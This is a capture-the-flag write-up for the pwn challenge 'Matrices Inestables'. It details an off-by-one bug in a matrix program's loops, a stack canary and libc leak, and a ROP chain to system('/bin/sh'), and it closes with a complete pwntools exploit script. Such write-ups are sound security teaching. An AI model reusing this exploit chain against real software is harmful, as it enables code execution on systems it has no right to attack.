# Matrices Inestables

| Field       | Value                          |
|-------------|--------------------------------|
| Platform    | Rooted 2026 / CaliphAllabs     |
| Category    | pwn                            |
| Difficulty  | Medium                         |
| Points      | -                              |

## Description
> Programa de multiplicacion de matrices con menu interactivo. Permite definir dos matrices A y B, calcular C = A*B, y mostrar el resultado.
>

## TL;DR
Off-by-one in the read/multiply/show loops (uses `>=` instead of `>`) allows reading/writing 17x17 elements for a 16x16 matrix. This provides a canary + libc leak and allows writing a ROP chain over main's return address.

## Initial Analysis

```
$ file matrices-inestables
ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped

$ checksec
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

All protections enabled. Ubuntu 24.04, glibc provided.

Functions: `main`, `read` (reads a matrix), `multiply`, `show`, `read_until`.

### Menu
```
1. Define A
2. Define B
3. Compute C = AB
4. Show C
```

### Matrix structure on the stack
```
struct matrix {
    uint32_t rows;     // offset 0
    uint32_t cols;     // offset 4
    uint8_t  data[16][16]; // offset 8, stride=16 bytes/row
};  // total: 0x110 = 272 bytes
```

### Main's stack layout
```
rbp - 0x334: choice (int)
rbp - 0x330: Matrix A (0x110 bytes)
rbp - 0x220: Matrix B (0x110 bytes)
rbp - 0x110: Matrix C (0x110 bytes)
rbp - 0x008: canary
rbp + 0x000: saved rbp
rbp + 0x008: return address
```

The matrices are contiguous: A ends where B starts, B ends where C starts.

## Vulnerability Identified

### Vulnerability Type
CWE-193: Off-By-One Error

### Detail
The loops in `read`, `multiply`, and `show` use `cmp reg, var; jae loop_body` (unsigned `>=`) for the continuation condition. This produces a loop `for (i = 0; i <= N; i++)` instead of `for (i = 0; i < N; i++)`, iterating **N+1 times** in both dimensions (rows and columns).

```asm
; Example in read (inner loop):
0x13ea: mov edx, dword [rax + 4]  ; edx = cols
0x13f4: cmp edx, eax              ; cmp cols, j
0x13f6: jae 0x1371                ; if cols >= j → continue (off-by-one!)
```

With `rows=16, cols=16`, **17x17 = 289 elements** are read/written instead of 16x16 = 256.

### Overflow Consequences

**A overflow → B header:** The extra row of A (row 16, cols 8-15) overwrites `B.rows` and `B.cols`.

**B overflow → C header:** The extra row of B (row 16, cols 8-15) overwrites `C.rows` and `C.cols`.

**Multiply overflow → canary/rbp/ret:** Row 16 of C writes to:
- `C + 0x108 = rbp - 0x8` → **canary** (cols 0-7)
- `C + 0x110 = rbp` → **saved rbp** (cols 8-15)
- `C + 0x118 = rbp + 0x8` → **return address** (cols 16+)

## Solution Process

### Canary and libc leak

When defining B(16x16), the extra row 16 (cols 8-15) overwrites C's header:
- `C.rows = 16`, `C.cols = 24`

Then `show(C)` (option 4) without having done multiply: C was not initialized, it contains stack data including the canary and return address. Show reads 17 rows of 25 columns thanks to the off-by-one.

Row 16 of the output contains:
```
cols  0-7:  canary (8 bytes)
cols  8-15: saved rbp (8 bytes)
cols 16-23: return address (8 bytes) → libc_base + 0x2a1ca
```

### Prepare payload in B

Redefine B(16x16) with the ROP chain encoded in the first rows:
```
B[0][0..7]  = canary bytes      (restore canary)
B[0][8..15] = 0x0               (saved rbp, irrelevant)
B[1][0..7]  = ret gadget        (stack alignment)
B[1][8..15] = pop rdi; ret
B[2][0..7]  = &"/bin/sh"
B[2][8..15] = &system
```

The data `B[row][col]` is accessed in memory as `B_base + 8 + row*16 + col`, so the data from consecutive rows is contiguous.

### Expand B.cols via A overflow

Define A(16x16) with specific values in the extra row:
- `A[16][0] = 1` → selector for multiply: `C[16][j] = 1 * B[0][j]`
- `A[16][8..11]` → `B.rows = 16`
- `A[16][12..15]` → `B.cols = 48`

This causes multiply to compute C with 48+1 columns, allowing **49 bytes** to be written in row 16: canary(8) + rbp(8) + ROP chain(32) + 1 extra.

### Multiply + exit → ROP

`multiply` computes `C[16][j] = sum(A[16][k] * B[k][j])` for k=0..16. Since only `A[16][0] = 1` (the rest is 0 except for B's header bytes which overwrite rows that don't contain payload), the result is `C[16][j] = B[0][j]` = our payload.

Upon exiting the loop (option 0), main executes `leave; ret` which jumps to the ROP chain:
```
ret (alignment) → pop rdi → "/bin/sh" → system()
```

## Discarded Approaches
- **Leak before multiply:** Cannot show C before its header exists. Solution: use B overflow to set C.rows/C.cols directly.
- **Partial 1-byte overwrite:** Insufficient for a full ROP. Solution: use A overflow to expand B.cols and obtain more write columns.

## Final Exploit
```
#!/usr/bin/env python3
"""
Challenge: Matrices Inestables
Category:  pwn
Platform:  Rooted 2026

Vuln: Off-by-one in matrix read/multiply/show loops (uses >= instead of >),
      reading/writing 17x17 elements for a 16x16 matrix.

Strategy:
  1. B's off-by-one overwrites C.rows/C.cols -> show C leaks canary + libc ret addr
  2. Define B with ROP payload in rows 0-2
  3. A's off-by-one overwrites B.cols=48 + sets A[16][0]=1 (multiply selector)
  4. Multiply: C[16][j] = B[0][j] -> writes canary + ROP chain past saved rbp
  5. Exit loop -> main returns -> ROP -> system("/bin/sh")
"""
from pwn import *
import re, os

BINARY = "./matrices-inestables"
LIBC = "./libc.so.6"
HOST, PORT = "challs.caliphallabs.com", 9925

context.arch = 'amd64'
context.log_level = 'info'

libc = ELF(LIBC)
LIBC_RET_OFFSET = 0x2a1ca  # __libc_start_call_main: call *%rax + 2

def get_process():
    if args.REMOTE:
        return remote(HOST, PORT)
    elif args.GDB:
        context.binary = ELF(BINARY)
        return gdb.debug(BINARY, gdbscript='b *main+340\nc')
    else:
        return process(BINARY)

def define_matrix(io, option, rows, cols, values):
    rows_strs = []
    for r in range(rows + 1):
        row_vals = ",".join(str(v) for v in values[r])
        rows_strs.append(f"[{row_vals}]")
    mat = "[" + ",".join(rows_strs) + "]"
    io.sendlineafter(b'> ', str(option).encode())
    io.sendlineafter(b'espacio): ', f'{rows} {cols}'.encode())
    io.sendlineafter(b'matriz: ', mat.encode())

def exploit():
    io = get_process()

    # LEAK canary + libc via show(C) ===
    # B's off-by-one row 16 cols 8-15 overwrite C header (C.rows=16, C.cols=24)
    B = [[0] * 17 for _ in range(17)]
    B[16][8] = 16   # C.rows
    B[16][12] = 24  # C.cols -> show reads 17 rows x 25 cols
    define_matrix(io, 2, 16, 16, B)

    io.sendlineafter(b'> ', b'4')
    result = io.recvuntil(b']]\n')
    parsed = re.findall(r'\[([^\[\]]+)\]', result.decode())
    v = [int(x.strip()) for x in parsed[16].split(',')]

    canary = u64(bytes(v[0:8]))
    ret_addr = u64(bytes(v[16:24]))
    libc.address = ret_addr - LIBC_RET_OFFSET

    log.success(f"Canary: {hex(canary)}")
    log.success(f"libc base: {hex(libc.address)}")

    # === ROP chain ===
    rop = ROP(libc)
    ret_g = rop.find_gadget(['ret'])[0]
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    bin_sh = next(libc.search(b'/bin/sh\x00'))

    # ret (alignment) -> pop rdi -> "/bin/sh" -> system
    chain = p64(ret_g) + p64(pop_rdi) + p64(bin_sh) + p64(libc.symbols['system'])
    payload = p64(canary) + p64(0) + chain  # canary + rbp + rop = 48 bytes
    ncols = len(payload)  # 48

    # B[row][col] accessed at flat offset row*16+col
    B2 = [[0] * 17 for _ in range(17)]
    for i in range(len(payload)):
        B2[i // 16][i % 16] = payload[i]
    for r in range(16):
        o = r * 16 + 16
        if o < len(payload):
            B2[r][16] = payload[o]
    define_matrix(io, 2, 16, 16, B2)

    # A's off-by-one row 16 cols 8-11 -> B.rows=16, cols 12-15 -> B.cols=48
    # A[16][0]=1 so C[16][j] = sum(A[16][k]*B[k][j]) = 1*B[0][j] = payload[j]
    A = [[0] * 17 for _ in range(17)]
    A[16][0] = 1
    A[16][8] = 16              # B.rows
    A[16][12] = ncols & 0xff   # B.cols
    define_matrix(io, 1, 16, 16, A)

    # === PHASE 5: Multiply + exit -> ROP ===
    io.sendlineafter(b'> ', b'3')  # multiply
    io.sendlineafter(b'> ', b'0')  # exit loop -> leave; ret -> ROP

    log.success("Shell!")
    io.interactive()

if __name__ == "__main__":
    exploit()

```
See `exploit.py`. The exploit follows this sequence:
1. Define B → set C header → show C → leak canary + libc
2. Define B → payload (canary + ROP chain)
3. Define A → set B.cols=48 + multiply selector A[16][0]=1
4. Multiply → writes payload over canary/rbp/ret
5. Exit → shell

## Execution
```bash
python3 exploit.py                # Local Docker (requires patchelf)
python3 exploit.py REMOTE         # Remote
python3 exploit.py GDB            # Debug
```

## Flag
```
clctf{4w3s0m3_O0B_r0p_w1th_s7ack_p1vo7!}
```

## Key Lessons
- An off-by-one (`>=` vs `>`) in array iteration can escalate to RCE when structures are contiguous on the stack.
- Overwriting headers of adjacent structures allows expanding the reach of OOB reads/writes.
- Matrix multiplication as a controlled write primitive: by choosing A as a "selector" (a single non-null row), it becomes `C[i][j] = B[m][j]` -- arbitrary byte-by-byte write.
- In modern glibc (2.39+), main's return goes to `__libc_start_call_main + offset`, not directly to `__libc_start_main`.

## References
- Stack layout analysis via radare2 decompilation
- glibc 2.39 (Ubuntu 24.04) __libc_start_call_main at offset 0x2a1ca
